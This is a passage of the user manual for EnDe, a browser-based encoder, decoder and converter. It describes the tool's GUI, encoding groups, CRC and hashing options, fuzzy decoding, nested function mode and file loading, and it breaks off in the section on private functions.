	EnDe - Encoder, Decoder, Converter, Calculator, TU WAS DU WILLST .. [1]
		for various codings used in the wild wide web
	
	
SYNOPSIS
	
	Click & Enjoy
	
	
QUICK START
	
	Type, click & go.
	After installation (see below) or opening the proper URL,  EnDe can be
	used right away without reading the whole manual here. Most fields and
	buttons and so on come with a brief description.
	
	Key in your text in the proper  input field,  select any of the listed
	actions in the selection box on the left, and ready you go.
	
	If you feel that you need to know more, just click on [?] button which
	should jump to the proper description in the manual.
	
	Or check the  EXAMPLES, HINTS  below to get some examples right away.
	
	If you want to perform more sophisticated actions, please read the
	  BEFORE DECODING  section below first.
	
	There is a small FAQ in http:EnDe.man.html?EnDe.FAQ.txt .
	
	EnDe does not make any HTTP requests, anything is done in the browser.
	Ooops wrong, the manual pages and loading external files are done with
	a HTTP request, though.
	
	
INTRODUCTION
	
	What is EnDe useful for, what differs from other similar tools?
	
	The answer to this often asked question is  manifold,  so let's try to
	explain with examples.
	
    US-ASCII EXAMPLE
	
	Using the string  'Euro' for some codings and hashes:
	
+-
|	   CRC-32       base64     urlUTF-8             MD5(hex)
|	------------+-----------+-----------+---------------------------------
|	1fb0ba15     RXVybw==    Euro        3E823FAC7473E42888932C7761C224FC
+-
	
	Trying these codings and hashes in various tools  should always return
	the same result. Not very surprising, it's expected to do so.
	
    COMMON EXAMPLE
	
	Now let's replace the  'E' by 'â‚¬' which then is 'â‚¬uro'.
	If all characters are Unicode (UCS-2) the result is as follows:
	
+-
|	   CRC-32       base64     urlUTF-8             MD5(hex)
|	------------+-----------+-----------+---------------------------------
|	b4c7b4a7     IKx1cm8=   %e2%82%acuro 08c1d37a0b3394da278b77116cc4e615
+-
	
	Trying these codings and hashes  in various tools  most likely returns
	different result depending on the tool. See following examples.

	The results are different. We'll have even more fun when copying (copy
	& paste) from one tool to another.
	
	What is wrong?
	There is nothing wrong and it's not a bug in those tools.
	Just a different interpretation of the given input data. In particular
	the charset of the input data.

	Unfortunatelly some of the tools even fail to decode correctly without
	removing the trailing '='. This is not mentioned in above table.
	Please make your own opinion if it's a bug or feature.
	
	This makes 11 different results for 21 tools.
	
	Finally, this introduction  was compiled in 2010 and 2011  where these
	problems still exist (however, EnDe development began in 2006).
	
    BROWSER TOOL - EnDe
	
	While having so much trouble to get the right encoding,  EnDe was born
	so that (hopfully) a reliable coding, hashing etc. exists in browsers.
	EnDe does not claim to do it the right way,  but it at least tells you
	how the input data is used (always Unicode, except told otherwise).
	
	As explained below, EnDe's main purpose is for HTTP/HTML processing so
	that we don't have such media discontinuity anymore.
	
    TARGET AUDIENCE
	
	EnDe can be used for various duties, the audience may be:
	* developers building secure applications
	* penetration testers (see also [6], [7])
	* analysing malicious web applications
	* anyone interested in codings
	
	
DESCRIPTION
	
	EnDe  is a library with a collection of functions for various codings,
	encodings, decodings and conversions.
	
	The objectives are mainly driven by the requirements for functionality
	in HTTP/HTML systems.  However, it's not limited to that, tell us your
	story ...
	
    IT SHOULD ..
	
	* .. be possible to be used in a straight forward way
	* .. have mainly just one click for each functionality
	* .. be possible to nest functions for continous use
	* .. be usable anywhere at any time
	
    IT IS NOT ..
	
	* .. a replacement of all/most of the tools mentioned at  LINKS  below
	* .. a perfect implementation (hey, you're engaded to fix all existing
	     bugs you find, add new features, improve usability, etc. :-)
	* .. a secure browser application
	* .. test for RegEx syntax (lint or alike)
	* .. converter for RegEx from or to another syntax (flavour)
	
    FURTHER DESCRIPTION
	
	The description of  EnDe's library functions  can be found at the  API  
	section below. The browser  interface to that API is described at  GUI  
	section below, and you find the  QUICK START  above for lazy people.
	
	
CONVENTIONS, TEXT MARKUP
	
	Following text markups are used herein:
	* [button] button  is a button in the GUI
	* "some text" is either a label in the GUI or a filename
	* 'some text' is a literal text
	* multiple lines of code, which is literal text too, look like:
+-
|	  first line
|	  second line
|	  ..
+-
	* a local link (same domain): http:other.html
	* external link (other domain): http://other.tld/page.html 
	* link pointing to an anchor in this help text:  QUICK START  
	* a numbered list:
	  # item 1
	  # item 2
	
	* a unnumbered list like this line
	* [ < ] jump to previous location in the help page (browser view only)
	* [ ^ ] jump to top of this help page (browser view only)
	
	
SECURITY
	
	EnDe was designed with no security in mind as it works without calling
	external URLs. It does not use JavaScript's 'eval()' or 'setTimeout()'
	except for:
	* nested function execution; in GUI only
	* "Beautify -> .toSource()"; in GUI only
	* "Beautify -> .JSReg" which uses 'eval()' internal, in GUI only
	* [eval] action (button) in Functions window; GUI only
<!-- 03/2011 no longer used
	* Dean Edward's Packer [5] for compressed JavaScript files;
	  EnDe online version only
     12/2010 no more .json files
	* "create menu" from .json files;  GUI OPTIONS  section in GUI only
-->
	
	This pertains to the GUI only, while the API does not use  'eval()'.
	
	Use EnDe at your own risk.
	
	
INSTALLATION
	
	Installation is quiet simple:  copy the files from your  http:EnDe.tgz
	download to any directory and point your browser to  http:index.html .
	Ready you go.
	
    INSTALLATION for a WEB SERVER
	
	Copy the files from your download to the directory of your web server.
	It's recommended that all files are delivered by the web server  using
	'Charset-Set: UTF-8', though it should work with other charsets also.
	
	In Apache you either have to change "httpd.conf" and restart apache or
	use a ".htaccess" file in your directory as follows:
+-
|	< Location "/EnDe/">
|	    AddDefaultCharset        utf-8
|	    AddType text/css;charset=utf-8  .css
|	    AddType text/html;charset=utf-8 .html
|	    AddType text/plain;charset=utf-8 .txt
|	    AddType text/javascript;charset=utf-8 .js
|	< /Location>
+-
	
	(depending on the location of this ".htaccess" the '< Location>' scope
	is obviously obvious:)
	
    BROWSER CONFIGURATION
	
	The browser should be configured with  'Charset-Set: UTF-8'.   Even it
	would work with common settings too, lesser problems are expected.
	
    JAVASCRIPT VERSIONS
	
	All JavaScript code relies on  ECMA-262  standard (ECMAScript v3).
	
    RECOMMENDATION
	
	For good security reasons  most browsers restrict access to files from
	the same domain (Same Origin Policy).  If files other than those being
	part of the GUI should be read (for example with the "Load Local File"
	function), then it's recommended that EnDe is installed locally and is
	accessed local as file like:  file:///path/to/index.html .
	Less problems are expected ... but see  KNOWN GUI PROBLEMS  also.
	
	Following browsers are known to work flawless:
		Webkit, Mozilla 1.7.x, Firefox 2.x, Firefox 3.x .. 11.x
	For anything else the  BROWSER QUIRKS  need to be consulted.
	
	
BEFORE DECODING
	
	While all encodings work flawless, decoding data to its previous state
	(decode data) needs some pre-conditions. That's why some decodings may
	return unexpcted results at first glance.
	
	As decoding needs some care,  it is recommended  to start with decoded
	data first,  encode it and then decode it,  which should result in its
	primitive state (that's how the testing is implemented).
	
	If unknown data should be decoded, and the result contains errors then
	it might be usefull to remove some charaters at the beginning and then
	start the decoding again. Also try to decode just parts -hint: use the
	"selection" switch in  GUI OPTIONS.  
	
	Often data looks like  simple encoded data, but is a mix of encodings,
	or partially encoded only, or multiple encoded or ...
	In such cases the  "Fuzzy decoding" actions may help, or one of the
	"User functions" actions, see  FUNCTIONS.  
	
	I. g. humans are much better skilled in deciding to use which decoding
	for which part of the data. "Fuzzy decoding" and  "User functions" are
	just an attempt to manage some common cases  and should not considered
	perfect.
	
	
GUI
	
	"EnDe.html" is the  GUI  to the 5 groups of functions (called  TOOLS  
	herein). Each tool provides its own set of functions (called  ACTIONS  
	herein) which accept some parameters. Each tool has its own section in
	the GUI.
	
	Global  functionalities and parameters for all tools  are available in
	the  GUI OPTIONS  and  API OPTIONS  section preceding the five  TOOLS  
	sections.
	
	All in all, EnDe consist of following sections:
	* Trace (optional)
	* Test  (optional)
	* GUI Options
	* API Options
	* Character
	* En- / Decoding
	* IP Converter
	* Timestamp Converter
	* RegEx - Regular Expressions
	
	The tools, which are the last 5 sections, are described below.
	
	Additional to these sections, there exist some inset windows which are
	used to configure more general functionality. The inset windows are:
	* Functions
	* Replace Map
	* Browser Quirks
	
	Each will be activated with a button in the  GUI OPTIONS  section.
	
	The look & feel of the GUI depends on the browser.  Unfortunately some
	browsers behave strange. The GUI can be tweaked to work around some of
	these browser quirks. See  BROWSER QUIRKS  for more details.
	
    GENERAL DESIGN HINTS
	
	All buttons, checkboxes and select menus will show a brief description
	when the mouse is over the element (using the tags 'title' attribute).
	If the description is  missing, mainly for  'SELECT' tags, then please
	refer to  KNOWN PROBLEMS  for more details.
	
	Any select menu item calls an action which changes something somewhere.
	Same applies to all (light-blue) coloured buttons.
	Whereas all buttons in standard browser style open a new window and do
	not change other fields, usually.
	
	Keep in mind that the menus of type SELECT  are configured to call the
	assigned action when an item receives a click or mouse-up event.
	No additional click is required (click & go).
	
	Due to various problems in the behaviour of standard HTML SELECT menus
	(the traditional popup menus in one line and the pulldown arrow right)
	such menus may not work as expected. See the  KNOWN PROBLEMS  for more
	details.
	
	For customizing the GUI, see  CUSTOMIZE GUI  below.
	
    COMMON FUNCTIONS
	
	All tools have some actions in common.
	
	On top in the tool's header line:
          [-] button      to fold the tool's GUI
          [x] button      to close the tool's GUI (for inset windows)
          [?] button      to show the description (what you see here)
	
	On bottom of most tools (mainly below the textarea input field):
          [clear] menu    various actions, see  TEXT MENU  below
          [guess] button
          [guess] menu    to call a guessing action for the tool
          [Window ..]     to show the current data in a new window (rendered)
          [Scratchpad ..] to append the current data to the Scratchpad window
	
	When using the windows ( [Window ..] , [Scratchpad ..] button) you can
	preserve various results for later use. The texts can simply be copy &
	pasted from these windows. The [Scratchpad ..] window is writable.
	
	Some tools provide 3 tab-like buttons to switched text representations
	in their textarea input fields:
	
	 [Text] tab
		Shows text as keyed in or pasted or generated.  For characters
		outside the (integer) range 30 .. 127  the displayed character
		depends on the  browser's implementation and/or the  browser's
		configuration.
	 [Hex] tab
		Displays the corresponding hex value for each character.
		The left part of the display shows the hex values  for each of
		the characters.  The right part shows the character itself  (a
		dot  '.' for none printable US-ASCII characters).
		Right and left part are separated by a  '|' (bar).
		Hex values are one byte usually. Unicode characters greater to
		'0xff' are written as 2 bytes without a space in between. This
		allows to destinguish 1-byte characters from 2-byte characters
		(1-byte: 0 .. 255, 2-byte: 256 .. 65335).
		Hint:  This can also be used to convert 2 bytes to one Unicode
		character,  for example: change  '20 ac' to  '20ac' to get the
		Unicode character  '&#8364' ,  the 'â‚¬' currency sign.
		NOTE:  only changes in the left (hex) part can be converted to
		the [Text] representation.
		See also "Special -> od-x style" decoding.
	 [parsed] tab
		Shows text beautified for better (human) reading.
		`parsed' means different things in different tools.
		In the En-/Decoding section for example it replaces all '&' by
		newlines (\n), and all '=' by tabs. In the Functions window it
		tries to ident the function parameters and the nested function
		calls. For Regular Expressions it tries to ident on braces.
	
	The representations can be switched from  [Text], [Hex] or [parsed] to
	to [Hex], [parsed] or [Text] or vice versa.
	It's recommended that [Text] is selected when using actions.
	
	As described above most tools also provide the  [clear]  pulldown menu
	with actions for special text manipulations/conversions. These actions
	apply to the corresponding (above) textarea input field. Each of these
	action will be explained with a help text provided by each menu entry.
	For more detaisl see the  TEXT MENU  below.
	NOTE: the results of these actions are not reversible.
	
    MODE
	
	EnDe's tool actions operate in one of two modes: "direct" or "nested",
	see [Functions] button in  GUI OPTIONS  (or Quick Bar).
	However, currently only en-/decoding supports these modes.
	
	Direct Mode
	=======================================
	In direct mode all actions are executed immediately, encoded data will
	be stored in the Decoding textarea  and decoded data will be stored in
	the Encoding textarea. This is the default.
	
	Nested Mode (Functions inset window)
	=======================================
	The  FUNCTIONS  inset window will be shown  and all actions clicked in
	Encoding or Decoding  are stored as  a JavaScript function call in the
	window's textarea box. More functions can be found in the select menus
	at bottom of the window. Additonally any valid JavaScript can be added
	in the texarea field as needed.
	
	This code will then be execuded on demand, just like any other action,
	by the buttons found in "show results in ..".
	It's called "nested" because each result of an action is used as input
	to the next action, this way actions can be chained together.
	
	The generated JavaScript code will simply be stuffed to  'eval()'.
	Any valid JavaScript can be added to the generated code as needed. See
	  EXAMPLES, HINTS  below also.
	
	For a detailed description of the Functions inset window see  FUNCTIONS  
	below.
	
    ACTIONS
	
	Actions in the context of EnDe are functions for encoding, decoding or
	some kind of conversion of any data (most commonly character strings).
	
	Available actions are mainly the select menu or buttons to the left of
	the input fields. For a description see the help text provided by each
	seletct (option) entry or button.
	
	Most actions are mapped to a unique function of the  API.  
	Though, some actions are implemented in the GUI only.
	
    TOOLS
	
	All tools have a set of actions,  mainly grouped in the select menu to
	the left. This menu comes with a description itself for each entry, so
	no further description for the actions will be found here.
	
	Most tools also have some special  text manipulation functions (mainly
	at the bottom of each tool).  The detailed description for them can be
	found at  COMMON FUNCTIONS  above and  TEXT MENU  below.
	
	All tools - their actions in particular -  use settings and parameters
	from  API OPTIONS  (see description below).
	NOTE: (currently 2011) only the  En- / Decoder  use these settigs.
	
	The tools are described below with the  DETAILS **  headers.
	
    DETAILS Character
	
	Simple conversion  of a single character into  binary, octal, decimal,
	hex, UTF and Unicode representation.
	It also contains the  [Special Unicode] menu, see  UNICODE MENU  below
	for details.
	
    DETAILS En-/Decoding
	
	Encoded texts will be shown in the Decoding textarea and vice versa.
	There is no  detailed description of each action, the help text should
	be self-explanating.
	
	There're following options, which manipulate the given data in the en-
	or decoding textarea before they are passed to the selected action:
	
	"0x00"
		Add null byte (NUL) to end of text.
	"0x0a"
		Add newline (NL) character to end of text.
	"0x0d"
		Add carriage return (CR) character to end of text.
	"0x0a"
		Add newline (NL) character to end of text.
	"0x1a"
		Add end-of-text (SUB) character to end of text.
	
	NOTE:  These characters are added to the text only  before processing.
	They are not added to the textarea field.
	
	For practical usage of these options, see  EXAMPLES, HINTS  below.
	
	Following are common things and those which differ for some actions of
	the en-/decoding tool.
	
	For a description of the "Prefix", "Suffix", "Delimiter", "uppercase",
	"size", "Key", etc. see  API OPTIONS  below.
	
	The en-/decoding actions are grouped as follows:
	
	 "URI/URL"
		All these actions do not use "Prefix", "Suffix" or "Delimiter"
		but "uppercase" and "size".
		Exception is "Punycode" and "IDN" see below.
		NOTE: the "fullwidth (UTF-8)" encoding generates  3-byte UTF-8
		characters which most (all?) browsers cannot display.  This is
		not a bug (in the browser or EnDe) but a general limitation as
		JavaScript only supports Unicode (UTF-16).
	 "HTML-Entity"
		All these actions do not use "Prefix", "Suffix" or "Delimiter"
		but "uppercase" and "size".
	 "Unicode/UTF"
		All these actions do not use "Prefix", "Suffix" or "Delimiter"
		but "uppercase" and "size".
	 "Base-N"
		Various base-N encodings (namely base-64).
		All these actions do not use "Prefix", "Suffix" and "Key"  but
		"wrap" and "mode".  Where "wrap"  will inserts a newline after
		specified number of characters. "mode" (decoding only) behaves
		behaves as follows:
		* strict  - allows only valid characters and  requires padding
		* lazy    - allows only valid characters with optional padding
		* verbose - ignores invalid characters  (only valid characters
			    will be decoded), padding is optional. This can be
			    used for `impedance mismatch' decodings.
	<!-- empty line required to keep format; bug in EnDe.man.html -->	
	
	 "Coding"
		Some special codings, see  LIMITATIONS  below also.
		This group also contains  "Caesar",  "Rot13" and "RotN"  which
		are encryptions by definition.  But it is common practice that
		they are treated as codings as the key is well known or simple
		to detect.
	 "Straight"
		Some of these codings use the "size" value.
	 "Numbers"
		Simple number conversions.
		NOTE: huge numbers may be displayed using exponents.
	 "Characters"
		Does not use any of the options.
	 "En-/Decryption"
		All these function use the value from "Key" as cipher.
	 "Hash/Checksum"
		These actions exist in "Encoding" only, obviously.
		"RIPEMD-160" can also be found here (even it's not a real hash
		function), it uses the value from "Key" as cipher and requires
		a value in "Iteration".
		For more details see  Hashing (MD4, MD5, etc.)  below
		For CRC functions see description below.
	 "Escape Characters"
		These en-, decodings don't use any  API OPTIONS.  
	 "JavaScript built-in"
		These actions simply call the browser's built-in functions, so
		the results may be different depending on the browser.
		NOTE: some functions are not implemented by all browsers.
	 "Special"
		These en-, decodings don't use any  API OPTIONS.  
        	"Viewstate"   try to parse/fold ASP.NET 1.0 or 2.0 viewstate
		For  Viewstate the  API OPTION  "mode" (decoding only) behaves
		as follows:
		- strict  - all values are XML-escaped using:
			'EnDe.EN.dispatch("escXML", ...)'
		- lazy    - all values are printed as is
		"xdump style"  decode space seperated hex values.
		Allowed formats:
			left side with hex values separated by delimiter right
			side any character:
			     'de,ad,beef | string'
			left side  with hex values separated by spaces,  right
			and left side are separated by '|':
			     'de ad beef | string'
			or right side may be missing, but not the separators:
			     'de ad beef |'
			Separator is any character which is not a hex (a-f0-9)
			character. Example:
			     'de ad beef string'
			     'de ad beef  $'
			all 4 lines decode the hex values 'de' 'ad' and 'beef'
		"od -x style"  decode space seperated 2- or 4-byte hex values.
		Allowed formats same as for "xdump style", but:
			The first field and all following spaces are ignored.
			Example: prefix=x
			     '0000 de ad | string'
			     '00100 beef | string'
			decodes the hex values 'de' 'ad' and 'beef'.
	 "Fuzzy decoding"
		These actions exist in "Decoding" only.
		For details see  Fuzzy Decoding  below.
	 "Symbols"
		Some function to convert to `symbols'. The symbols are written
		as ASCII-art,  hence most of these  conversion functions exist
		as encoding only. For some fucntions see the [esoteric] button
		in  GUI OPTIONS  below.
		See [User API Options] menu also for symbol representations.
	 "Beautify"
		Just some function to make the URL's search part or JavaScript
		code human readable.
		Following actions print the result in their own window and not
		in the En-/Decoding textarea:
		"JSDecode"  to make obfuscated JavaScript human readable.
		"JSFormat"  to make compact JSON or JavaScript human readable.
		While "JsDecode" is more usefull for JavaScript, "JSFormat" is
		better for JSON data (in the author's opinion:).
		"JSReg"  parse given source with JSReg sandbox.
		"show as image"  try to display data as image.
	
          [guess] menu
		This button contains a menu consisting of above menu groups.
		Selecting such a submenu  allows guessing  for just that group
		of actions.
	
	Punycode, IDNA Punycode
	=======================================
	Punycode and IDNA Punycode is usefull for hostnames (FQDN) only.  Each
	part of the FQDN needs to be en-/decoded seperately.  That is what the
	standard "Punicode" and "(xn--)IDN" actions do.
	Some systems provide the `libidn' with the corresponding `idn' program
	which adds the '-' delimiter as trailing character if no character was
	encoded. To support this behaviour the  "Punicode (libidn compatible)"
	[User API Options] was added, which passes "Suffix" for this delimiter
	to the actions.
	NOTE that some versions of  `libidn' are buggy; they may bail out with
	an error or even crash when decoding some strings. Also note that some
	versions always encode the complete string instead of splitting at the
	'.' (dot). Such bugs are not implemented in EnDe ;-)
	
	CRC
	=======================================
	There are various implementations of different CRC - Cyclic Redundancy
	Codes/Checks - algorithms to be found in the wild.  It is difficult to
	explain all the variants and some of them are even confusing.
	For a detailed description see [8].
	
	The basic idea of these algorithms are:
	* there is an initial vector
	* compute the checksum of the given data using ploynomial arithmetic
	* an output mask may be added to the result.
	
	Furthermore all the used data may undergo some  transformations called
	`reflection' [*]  like:
	* reflect the data per byte
	* reflect the data as a whole
	* reflect each byte of the data and then byte-vice as a whole.
	
	These reflections can be performed on:
	* the inital vector
	* the ploynom (which is in fact the same as using different values)
	* the given data
	* the mask for the result
	* the result itself (before finally XOR'ed).
	
	The algorithms can be done by coding loops for processing the data, or
	by using  prebuild transformation tables  instead of processing, which
	then results in better performance.
	And as this is not enough confusion, some people mix the inital vector
	and the ploynomial which results in 2 modes of the algorithm called:
	* direct
	* non-direct
	
	[*] reflect  - swapping all of its bits around the central point
	
	EnDe uses the coded algorithm and table driven algorithms depending on
	the selected CRC type. Only a few types are supported directly.
	The full support for algorithmic and table driven calculations is only
	available in the  API  , while the  GUI  is limited to the most common
	CRC functions used in pratice.
	The  API  can be used directly for example in "nested" mode by writing
	the corresponding function calls there (details see "EnDeFunc.txt").
	However, there is a workaround in the GUI to supports some parameters:
	 "Prefix"
		the value for the initial vector (hex digits prefixed '0x')
	 "Suffix"
		the value for the output mask (hex digits prefixed '0x')
	 "Key/Cipher"
		the value for the polinomial (hex digits prefixed '0x')
		or a constant for using predifined tables:
		- 'ARCtab'
		- 'MODtab'
		- 'PPPtab'
<!-- NOT YET IMPLEMENTED
		- 'C32tab'
	 Delimiter
		following fixed key can be used:
		- 'REFIN'
		- 'REFOUT'
		- 'REVERSE/REFLECT'
  -->
	NOTE: the "values are hex" checkbox is not observed.
	
	Some  common used combinations  are defined in the  [User API Options]
	menu and can be used with the "CRC (user)" action.  They are useful as
	example if special CRC types should be crafted.
	The avaialable encoding actions "CRC-8", "CRC-16", "CRC-16(CCITT)" and
	"CRC-32" do not use these parameters (as they are already hardcoded).
	NOTE also that these actions return the result hex-encoded without any
	prefix, suffix or delimiter. If the raw (integer) values are required,
	the "nested" mode must be used.
	
	The GUI to the CRC functions may (needs to:) be improved in future.
	
	Hashing (MD4, MD5, etc.)
	=======================================
	Most of the hashing functions are awailable to return  their result in
	"raw", "hex" or "base64" format.
	The GUI to these functions may be improved in future  so that there is
	only one action and the mode ("raw", "hex" or "base64") is selected by
	an option elsewhere.
	
	Fuzzy Decoding
	=======================================
	All en-/decoding functions process each charcater or string pattern in
	the given string. If there are different encodings used in the string,
	they cannot be decoded proper as most decoding functions may return an
	error if a pattern does not match the selected coding.
	
	The fuzzy decoding functions try to circumvent these oddities.
	The idea behind fuzzy decoding is  that most codings are restricted to
	only some parts of the string. Most languages use single quotes ' and/
	or double quotes '"' to enclose literal strings.
	Currently (04/2011) all fuzzy functions perform decoding inside quoted
	strings only (where EnDe supports braces as `quotes' too).
	Inside strings  fuzzy decoding tries to detect the selected coding and
	then passes the matched string to the proper decoding function and add
	the result of the function, if any, to the decoded string.
	
	To avoid improper matches, fuzzy decoding uses several decoding types.
	For example:
		* \-escaped     for octal codings
		* \x-escaped    for hex codings
		* %-escaped     for URL codings
		* HTML Entity   for HTML codings
	
	Each function tries to match the longest possible pattern first,  then
	tries to match the next pattern.
	
	The functions are restricted to either  decode inside single quotes or
	inside double quotes.  If both is required,  both functions need to be
	called in two separate steps.
	
	Fuzzy decoding can also be used with the  prefix, suffix and delimiter
	settings from  API OPTIONS.  In this mode decoding is done for strings
	enclosed in prefix and suffix/delimiter.
	
	NOTE that fuzzy decoding hex strings decodes 2 characters, while fuzzy
	decoding decimal or octal strings assumes 3 characters  (hence leading
	zeros may be necessary).
	
	Some useful combinations of  fuzzy decoding functions  can be found as
	user functions in "EnDeUser.xml"  which are available in the Functions
	inset window's "User functions", see  FUNCTIONS.  
	
    DETAILS IP Converter
	
	Should be self-explanating. The menu on left uses the mouse-over event
	to highlight the input field used as source for the selected action.
	Each IP conversion fills all fields.  <!-- except "IP in reverse order" -->
	
    DETAILS Timestamp Converter
	
	Each Timestamp conversion also fills all fields.  <!-- except "Ref. Time" and "Offset" -->
	Timestamp has it's own description see http:EnDe.man.html?EnDe.TS.html
	
    DETAILS RegEx
	
	Explain and pretty print regular expression.
	
	Regular expressions (aka RegEx) are used in many tools and programming
	languages.  Unfortunately there exist  dozens  of different languages,
	flavours and syntax notations to express the RegEx. This tool tries to
	explain the given RegEx in human understandable words and phrases.
	Therefore it uses the common known phrases (mainly those used in POSIX
	and/or PCRE descriptions).
	
	Each action from menu opens a window  with such an explanation for the
	RegEx (found in RegEx textarea).  This window also displays the result
	of that regex matched against the text found in Text textarea.
	
	RegEx has it's own description see http:EnDe.man.html?EnDeRE.man.txt .
	
    DETAILS Test
	
	Use the  [Test] button or the '?test' option to display this section.
	
	This section provides some test functionalities for EnDe's functions.
	Following buttons are available:
	
	 [run tests from file]
		Loads file with test patterns and performs all tests specified
		in the file, then displays the test results.
		The default file with the test patterns is "EnDeTest.txt". Any
		other file specified in  "Load File" [Menu]  can be used. Just 
		the filename needs to be specified  and no further button used
		there (see  LOADING FILES  for details).
	 [run tests from input]
		Instead of reading the test patterns from a file (as described
		above) they will be read from the Encoding textarea.
		Hint: any file can be loaded to the Encoding textarea with the
		[>Encoding] button for the "Load File" [Menu].
	"last used test pattern"
		This field contains the last used test pattern from the tests.
	[E] button
		Copies the last used test pattern to the Encoding textarea.
	[clear] button
		Removes the generated test results from GUI.
	"Check-Test" link
		Opens page with special tests for "EnDeCheck.js".
	"HTTP-Test" link
		Opens page with special tests for "EnDeHTTP.js".
	
    DETAILS Trace
	
	This section is for interanl use and debugging purpose.
	Use the [trace] button or the '?trace' option to display this section.
	
    GUI OPTIONS
	
	Following options and settings are used in/for the GUI only.
	
	 "[] selection"
		If checked use only selected text as input to the action.
	 "[] append"
		If checked result from the action is appended to corresponding
		field. If unchecked, all text is replaced (default).
	 [Funtions]
		See  MODE  above.
	 [Replace Map] button
		Details see  REPLACE MAP  below.
	 [Shuffle] button
		This button opens a window to select a  source and destination
		field to copy values.
	 "Load File"
		See  LOADING FILES  below.
	 "Info:"
	 [Trace] button
		Display the  DETAILS Trace  section with debugging output.
	 [Test] button
		Display the  DETAILS Test  section.
	 [Tour] button
		** experimental **
		Start a tour through EnDe GUI.
	 [Status Bar] button
		Display a stutus bar which shows actions (for debugging).
	 "Misc:"
	 [experimental] button
		This button  toggles the  display of  functionality  currently
		impleneted experimental or not fully working.
	 [esoteric] button
		This button  toggles the display of  rarely used functionality
		(mainly in RegEx tool).
	 [Browser Quirks] button
		Display the  BROWSER QUIRKS  inset window.
	 "display just one tool" menu
		Hides all tools except the selected one.
	
	Some options and settings are grouped together  and can be fixed on top
	of the browser page for permanent easy access. The [fix] and [x] button
	toggles this behaviour.
	
	
    API OPTIONS
	
	Following options and settings are used as parameters to the functions
	called in the API.
	
	 "mode"
		** NOT YET IMPLEMENTED ** <!--  .. EnDe*.js does not use exceptions -->
		Mode how to deal with error in coding/converting functions:
		"() strict"
			return empty string if any error occours
			also uses strict standard conformance if possible
		"() lazy"
			silently ignore errors
			some characters or strings may be missing then
			NOTE: this may return wrong results in some cases
		"() verbose"
			return an error message enclosed in brackets
			NOTE: wrong results are returned if there're errors
	 "[size] menu"
		Option used in "Hex", "Decimal", "Octal" and "Caesar" coding.
		Length of generated hex, decimal or octal values.
		NOTE: hex letters  'A' - 'F' are considered digits here ;-)
		Leading zeros will be added.
		Value  '1' is special:  if used while decoding,  the  decoding
		functions can use  variable width values  which are identified
		by "Delimiter" and/or "Suffix".
		Examples:
		-   '102111111'  will decode to 'foo'.
		-   '66,00006F,006F'  will decode to 'foo' for "size" '1'.
<!-- do not use * here -->
	 "[] uppercase"
		If checked all characters in conversion are upper case.
		NOTE:  does not convert the coding-specific prefix like  '%x',
		'%u', as well as  "Prefix" and  "Suffix" values to upper case.
		Used in all encodings producing hex values.
		Hint:  if the coding-specific character should be converted to
		upper case too, use the "Upper Case" encoding action.
	 "[] values are hex"
		If checked the  character/string for  "Prefix",  "Suffix"  and
		"Delimiter"  will be treated as hex value and converted to the
		character/string based on that value.
		Examples:
		-   '09' will be converted to 'TAB' character.
		Each hex value must be two digits [0-9A-F].
	 "Prefix"
		Prefix character/string used in en-/decodings.
		The prefix prepends the encoded character/string.
	 "Suffix"
		Suffix character/string used in en-/decodings.
		The suffix follows the  encoded character/string  right before
		the delimiter.
	 "Delimiter"
		Delimiter character/string used in en-/decodings.
		Delimiters are between two characters only, but not behind the
		last character (that's the difference to the suffix).
	 "Key/Cipher"
		Salt (key, cipher) for various encryptions. Currently used for
		"MD4/MD5/SHA1 HMAC" and "*/Caesar" only.
		NOTE: for  "Caesar" this must either be an integer '1' .. '26'
		or a single character  'a' .. 'z'.
	 "Iterations"
		Used for "RIPEMD-160" one-time password generation only.
	 "output format"
	 "wrap"
		Insert new line '\n' after "wrap" character.
		Used for "base64*" only.
	 "typ"
		Ouput format of function's result.
		Used for some "Staright->Hash/Checksum" actions only.
		"raw"
		"hex"
		"base64"
	 "[User API Options] menu"
		This menu sets following options (all above) for each entry:
		   "Prefix", "Suffix", "Delimiter", "uppercase", "size", "Key"
		   and "value is hex".
		It's meant as a shortcut for often needed settings.  This menu
		is customizeable, see  HACKER's INFO  below, in particular the
		"EnDeOpts.txt" file.
	
    LOADING FILES
	
	"Load File" is part of the  GUI OPTIONS  .
	Files can be loaded from the same origin where EnDe itself was loaded.
	Or files can be loaded from local file system (if the browser supports
	it).
	
	NOTE: loading files doesn't follow the `one click' schema as the other
	menus and buttons  but requires to select a file first  and then click
	the action button.
	
	The menus and selections are:
	 "Menu"
		Select a file to build a menu from.
	 "[section] menu"
		Select section where to add menu.
		This will be used for "Menu" selectios only and if there is no
		proper setting in "EnDeFile.txt"
	 "File"
		Field to manually define a file; also used by [browse] button.
		This field is used by both, the "Menu" selection and  [browse]
		button. It can also be set manually. Except for manual setting
		it will show the full local or remote path (URI) of the file.
		NOTE:  the same origin will be shown as path,  even if a local
		file was selected with the [browse] button. This is due to the
		browser's same origin policy.
		Please see  LIMITATIONS  also.
	 "[browse] button"
		Opens the browser's build-in file selection box.
		The choosen file will be stored in "File" field, see above.
	
	The action buttons are:
	 "[create menu] button"
		Action button to load the file and build the menu.
	 "[>Encoding] button"
	 "[>Decoding] button"
	 "[>RegEx] button"
		Content of file will be written to the corresponding textarea.
	
	When a single filename without path is given in "File", then this file
	will be searched for in the  "./usr/" directory first.  If there is no
	such file it will be search for without the "./usr/" directory.
	For customizing the GUI, see  CUSTOMIZE GUI  below.
	
	How to build user defined menus from loaded files, see  GUI MENUS.  
	
    FUNCTIONS
	
	This inset window has following options:
	 "() variable"
		Generated function call uses text variable as source.
	 "() value"
		Generated function call uses current value of text variable as
		source.
	
	The menu below the textarea input field provides special manipulations
	of the generated code.  The brief description given by the menu itself
	should be self-explanating ;-)
	
	The other buttons at bottom of the  textarea input field  are the same
	as those for the En-/Decoding textarea.
	
	Nice examples to understand the power of the  nested functionality can
	be found in "User functions" and  EXAMPLES, HINTS  below.
	
	There're 2 additional menus to select functions:
	"EnDe functions"
		Select function directly by name (see "EnDeFunc.txt").
	"User functions"
		Select function defined by user in "EnDeUser.xml".
	
	NOTE: these menus do not observe the "variable/value" option, but they
	observe the "append" checkbox of  GUI OPTIONS.  The generated variable
	can be replaced with its value by using the text functions.
	
	The [load] button can be used to load files into the textarea field.
	See  PRIVATE FUNCTIONS  for deatils below.
	
    PRIVATE FUNCTIONS
	
	The Function inset window can also be used to define private functions
	which then can be used later here like any predefined function by EnDe
	itself. The steps to define a private function are as follows:
	
	* write function definition in the textarea field, for example:
+-
